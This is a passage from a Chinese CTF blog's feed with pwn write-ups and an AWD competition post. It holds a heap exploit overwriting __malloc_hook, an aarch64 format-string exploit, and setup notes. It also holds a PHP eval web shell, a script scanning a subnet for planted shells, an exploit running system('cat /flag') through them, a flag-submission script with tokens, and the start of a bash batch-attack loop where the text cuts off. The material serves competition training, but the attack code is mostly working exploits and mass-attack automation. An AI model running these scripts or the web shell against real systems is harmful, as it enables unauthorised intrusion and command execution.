punctuation">,</span> <span class="token number">0xf03a4</span><span class="token punctuation">,</span> <span class="token number">0xf1247</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>malloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1e1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x148</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0xdf8</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x148</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>malloc_hook <span class="token operator">-</span> <span class="token number">0x23</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="something-changed"><a href="#something-changed" class="headerlink" title="something_changed"></a>something_changed</h3><p>漏洞点是格式化字符串，并且存在后门，限制了输入内容不能包含<code>$</code>，但还是可以直接用<code>fmtstr_payload</code>工具</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">size_t</span> v4<span class="token punctuation">;</span> <span class="token comment">// x19</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [xsp+FCCh] [xbp+2Ch]</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [xsp+FD0h] [xbp+30h] BYREF</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [xsp+FF8h] [xbp+58h]</span>  v7 <span class="token operator">=</span> _bss_start<span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> v6<span class="token punctuation">,</span> <span class="token number">0x50uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">>=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"$"</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试出偏移是<code>14</code>，开了<code>canary</code>保护，所以可以将<code>__stack_chk_fail_got</code>改成<code>backdoor</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> qemu-aarch64 <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn        aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%paaaaaaaa-0x7f3e313a1400-0x2d70252d70252d70-0xa7025-0x7f3e313a1448-<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>-0x8080808080-0x2c6f242c6f242c6f-0x7f3e313a13e0-0x7f3e30a48a00-0x400888-0x4008c0-0x7f3e313a13e0-0x4b30a489ac-0x6161616161616161-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'120.79.91.95'</span><span class="token punctuation">,</span> <span class="token number">3332</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token number">0x411018</span><span class="token punctuation">:</span><span class="token number">0x400770</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> write_size<span class="token operator">=</span><span class="token string">'short'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h3><h4 id="环境构建"><a href="#环境构建" class="headerlink" title="环境构建"></a>环境构建</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#必要环境</span><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> <span class="token function">make</span> ninja-build pkg-config libglib2.0-dev bison flex<span class="token comment">#安装qemu</span><span class="token function">wget</span> https://download.qemu.org/qemu-9.0.1.tar.xz<span class="token function">tar</span> xvJf qemu-9.0.1.tar.xz<span class="token builtin class-name">cd</span> qemu-9.0.1./configure<span class="token function">make</span> <span class="token parameter variable">-j8</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h4><p><code>-g</code>指定端口，<code>-L</code>指定动态链接库，静态链接的程序无需该参数</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-aarch64 <span class="token parameter variable">-g</span> <span class="token number">1234</span> <span class="token parameter variable">-L</span> ./libc/libc/lib ./pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture aarch64<span class="token builtin class-name">set</span> endian littleadd-symbol-file ./libc/libc/lib/libc-2.21.so<span class="token comment">#连接到正在运行的pwn，端口为qemu指定的端口</span>target remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="脚本调试"><a href="#脚本调试" class="headerlink" title="脚本调试"></a>脚本调试</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'aarch64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-aarch64"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span> <span class="token string">"1234"</span><span class="token punctuation">,</span> <span class="token string">"./pwn"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复盘了一下这学期欠缺的待学习内容，简单列了个学习计划，写了这篇博客记录一下暑假学习历程，也是激励自己每天多学一点&lt;/p&gt;
&lt;img src=&quot;/2024/07/05/2024-shu-qi-xue-xi-ji-lu/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E</summary>
      
    
    
    
    <category term="学习记录" scheme="https://starrysky1004.github.io/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>awd一句话木马批量攻击脚本</title>
    <link href="https://starrysky1004.github.io/2024/06/09/awd-yi-ju-hua-mu-ma-pi-liang-gong-ji-jiao-ben/awd-yi-ju-hua-mu-ma-pi-liang-gong-ji-jiao-ben/"/>
    <id>https://starrysky1004.github.io/2024/06/09/awd-yi-ju-hua-mu-ma-pi-liang-gong-ji-jiao-ben/awd-yi-ju-hua-mu-ma-pi-liang-gong-ji-jiao-ben/</id>
    <published>2024-06-09T07:02:43.000Z</published>
    <updated>2024-06-09T10:34:48.141Z</updated>
    
    <content type="html"><![CDATA[<p><code>awd</code>的批量攻击一直都在看<code>pwn</code>，<code>web</code>准备过几个脚本但还没实践过，这次上海市赛决赛现场调了一下批量攻击一句话木马的脚本，也是在现场废了不少时间…拿<code>pwn</code>的脚本改的，感觉<code>web</code>手的脚本会比我的简洁欸，凑合看</p><h2 id="扫描ip"><a href="#扫描ip" class="headerlink" title="扫描ip"></a>扫描ip</h2><p>一句话木马在文件在<code>/assets/scripts/pass.php</code>，内容如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在获取<code>hosts</code>的时候需要将<code>url</code>中的格式修改成木马文件的路径，<code>init_hosts.py</code>脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingli <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check_ip</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'http://10.103.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.1/assets/scripts/pass.php'</span></span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>            li<span class="token punctuation">(</span><span class="token string">'[+] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'hosts'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://10.103.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.1/assets/scripts/pass.php\n'</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"Not 200 OK"</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        ll<span class="token punctuation">(</span><span class="token string">'[-] '</span> <span class="token operator">+</span> url<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'h'</span><span class="token punctuation">,</span> <span class="token string">'a+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'http://10.103.</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.1/assets/scripts/pass.php\n'</span></span><span class="token punctuation">)</span>NUM_THREADS <span class="token operator">=</span> <span class="token number">256</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>check_ip<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>    thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>threads<span class="token punctuation">)</span> <span class="token operator">>=</span> NUM_THREADS<span class="token punctuation">:</span>        <span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>        threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> t <span class="token keyword">in</span> threads<span class="token punctuation">:</span>    t<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="攻击脚本"><a href="#攻击脚本" class="headerlink" title="攻击脚本"></a>攻击脚本</h2><p>需要修改<code>data</code>中的连接密码，例如本题是<code>pass</code>，<code>exp.py</code>代码如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> os<span class="token keyword">import</span> sys<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">write_to_flags</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">:</span>    fd <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./flags'</span><span class="token punctuation">,</span> <span class="token string">'ab'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>write<span class="token punctuation">(</span>d <span class="token operator">+</span> <span class="token string">b'\n'</span><span class="token punctuation">)</span>    fd<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>url <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"pass"</span><span class="token punctuation">:</span> <span class="token string">"system('cat /flag');"</span><span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    write_to_flags<span class="token punctuation">(</span>flag<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Flag 已写入到 flags 文件中。"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"获取 flag 失败："</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="批量提交flag脚本"><a href="#批量提交flag脚本" class="headerlink" title="批量提交flag脚本"></a>批量提交flag脚本</h2><p><code>url</code>格式也搞了好一会…得重学<code>python</code>了唉。<code>submit_flag.py</code>脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token keyword">import</span> os<span class="token keyword">import</span> json<span class="token keyword">import</span> requestsflag_file <span class="token operator">=</span> <span class="token string">'./flags'</span>threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">submit</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># url = 'https://ctf.bugku.com/awd/submit.html?token=88b02ce3b420ec1f4b4a2e02dd6fe305&amp;flag=' + flag[:-1]</span>        <span class="token comment">#url = f"curl -X POST http://27.25.152.77:19999/api/flag -H 'Authorization: 7f120ca9b0e3024d06734a04a986cc55' -d '&#123;&#123; \"flag\": \"&#123;flag[:-1]&#125;\"&#125;&#125;'"</span>        url <span class="token operator">=</span> <span class="token string">"curl -k -H \"Content-Type:application/json\" -X POST -d '&#123;\"token\": \"0c9651851218f216253a2b0d84d24cfd\", \"flag\":\""</span>        url <span class="token operator">+=</span> flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        url <span class="token operator">+=</span> <span class="token string">"\", \"pk\":\"be7e7b26c6a5235bcedc8531d6bfd648\"&#125;\' \'https://10.10.26.231/api/awd/batch_flag/\'"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token comment"># r = requests.get(url)</span>        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>url<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[+] pwned!\x1b[0m'</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m[-] connect fail: &#123;&#125;\x1b[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>flag_file<span class="token punctuation">)</span> <span class="token keyword">as</span> flag_txt<span class="token punctuation">:</span>        flags <span class="token operator">=</span> flag_txt<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> flag <span class="token keyword">in</span> flags<span class="token punctuation">:</span>            thread <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>submit<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>thread<span class="token punctuation">)</span>            thread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> thread <span class="token keyword">in</span> threads<span class="token punctuation">:</span>            thread<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="批量攻击脚本"><a href="#批量攻击脚本" class="headerlink" title="批量攻击脚本"></a>批量攻击脚本</h2><p>批量攻击脚本<code>attack.sh</code>如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span><span class="token assign-left variable">attack_times</span><span class="token operator">=</span><span class="token number">10000</span><span class="token assign-left variable">round_wait_time</span><span class="token operator">=</span><span class="token number">30</span> <span class="token comment"># 20 min</span><span class="token assign-left variable">wait_submit_time</span><span class="token operator">=</span><span class="token number">5</span> <span class="token comment"># 20 s</span><span class="token assign-left variable">log_file</span><span class="token operator">=</span><span class="token string">"logs"</span><span class="token assign-left variable">run_time</span><span class="token operator">=</span><span class="token number">120</span> <span class="token comment">#timeout</span><span class="token assign-left variable">next_attack_time</span><span class="token operator">=</span><span class="token number">2.5</span> <span class="token comment">#half time</span><span class="token assign-left variable">max_concurrent_attacks</span><span class="token operator">=</span><span class="token number">10</span> <span class="token comment"># Max number of concurrent attacks</span><span class="token function-name function">log</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token assign-left variable">t</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">date</span> <span class="token string">"+%H:%M:%S"</span><span class="token variable">)</span></span>    <span class="token assign-left variable">m</span><span class="token operator">=</span><span class="token string">"[<span class="token variable">$t</span>]<span class="token variable">$1</span>"</span> <span class="token comment"># Fixed missing parameter usage</span>    <span class="token assign-left variable">info</span><span class="token operator">=</span><span class="token string">"<span class="token entity" title="\033">\033</span>[43;37m <span class="token variable">$m</span> <span class="token entity" title="\033">\033</span>[0m"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$info</span>"</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$m</span>"</span> <span class="token operator">>></span> <span class="token variable">$log_file</span><span class="token punctuation">&#125;</span><span class="token function-name function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token builtin class-name">echo</span> <span class="token string">"-- round <span class="token variable">$1</span> -- "</span> <span class="token operator">>></span> all_flags    <span class="token function">cat</span> flags <span class="token operator">>></span> all_flags    <span class="token function">rm</span> flags   